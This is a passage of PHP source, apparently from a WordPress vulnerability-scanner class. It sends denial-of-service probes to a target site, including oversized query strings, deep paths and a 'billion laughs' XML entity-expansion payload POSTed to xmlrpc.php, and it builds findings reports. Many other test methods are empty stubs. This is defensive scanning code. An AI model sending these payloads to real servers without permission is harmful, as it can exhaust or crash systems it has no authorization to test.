        'url' => $url . '/?' . str_repeat('param=large&', 1000),
        'description' => 'Large query string parameters'
      ],
      // Deep path traversal
      [
        'type' => 'deep_path',
        'url' => $url . '/' . str_repeat('deep/', 50) . 'test',
        'description' => 'Deep path traversal'
      ],
      // XML entity expansion (potential billion laughs)
      [
        'type' => 'xml_bomb',
        'url' => $url . '/xmlrpc.php',
        'method' => 'POST',
        'body' => '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',
        'description' => 'XML entity expansion attack'
      ],
    ];

    foreach ($dos_tests as $test) {
      $args = $this->http_args;

      if (isset($test['method']) && $test['method'] === 'POST') {
        $args['method'] = 'POST';
        $args['body'] = $test['body'];
        $args['headers']['Content-Type'] = 'text/xml';
      }

      $response = $this->cached_request($test['url'], $args);

      if (!is_wp_error($response)) {
        $code = wp_remote_retrieve_response_code($response);
        $headers = wp_remote_retrieve_headers($response);

        // Check response time (basic DoS detection)
        // Note: This is a simple check - real DoS testing would require timing analysis

        // Check for resource exhaustion indicators
        if ($code >= 500) {
          return [
            'affected_url' => $test['url'],
            'description' => 'Potential DoS vulnerability: ' . $test['description'],
            'impact' => 'Attackers can cause server resource exhaustion or crashes',
            'recommendation' => 'Implement rate limiting, input validation, and resource limits',
            'steps_to_reproduce' => '1. Send ' . $test['description'] . '\n2. Check for server errors or timeouts',
            'evidence_url' => $test['url'],
            'screenshot_path' => $this->take_screenshot($test['url'], 'dos_' . $test['type'] . '_' . time())
          ];
        }

        // Check for XML parsing errors that might indicate successful attack
        $body = wp_remote_retrieve_body($response);
        if (stripos($body, 'entity') !== false && stripos($body, 'expansion') !== false) {
          return [
            'affected_url' => $test['url'],
            'description' => 'XML entity expansion vulnerability detected',
            'impact' => 'Attackers can cause DoS through XML parsing resource exhaustion',
            'recommendation' => 'Disable entity processing in XML parsers or limit entity expansion',
            'steps_to_reproduce' => '1. Send XML with entity expansion\n2. Check for parsing errors or resource exhaustion',
            'evidence_url' => $test['url'],
            'screenshot_path' => $this->take_screenshot($test['url'], 'xml_dos_' . time())
          ];
        }
      }
    }

    return null;
  }
  private function test_waf_bypass($url, $vuln)
  {
    return null;
  }
  private function test_input_validation_bypass($url, $vuln)
  {
    return null;
  }
  private function test_authentication_bypass($url, $vuln)
  {
    return null;
  }
  private function test_admin_functionality_exposure($url, $vuln)
  {
    return null;
  }
  private function test_privilege_escalation($url, $vuln)
  {
    return null;
  }
  private function test_mass_assignment($url, $vuln)
  {
    return null;
  }
  private function test_idor_extended($url, $vuln)
  {
    return null;
  }
  private function test_file_path_traversal_extended($url, $vuln)
  {
    return null;
  }
  private function test_unrestricted_file_upload($url, $vuln)
  {
    return null;
  }
  private function test_server_side_validation_bypass($url, $vuln)
  {
    return null;
  }
  private function test_client_side_validation_only($url, $vuln)
  {
    return null;
  }
  private function test_insecure_third_party_integrations($url, $vuln)
  {
    return null;
  }
  private function test_exposed_adminer_phpmyadmin($url, $vuln)
  {
    return null;
  }
  private function test_wordpress_file_editor_access($url, $vuln)
  {
    return null;
  }
  private function test_plugin_theme_editor_vulnerability($url, $vuln)
  {
    return null;
  }
  private function test_wp_cron_security($url, $vuln)
  {
    return null;
  }
  private function test_user_registration_security($url, $vuln)
  {
    return null;
  }
  private function test_comment_security($url, $vuln)
  {
    return null;
  }
  private function test_search_functionality_security($url, $vuln)
  {
    return null;
  }
  private function test_contact_form_security($url, $vuln)
  {
    return null;
  }
}
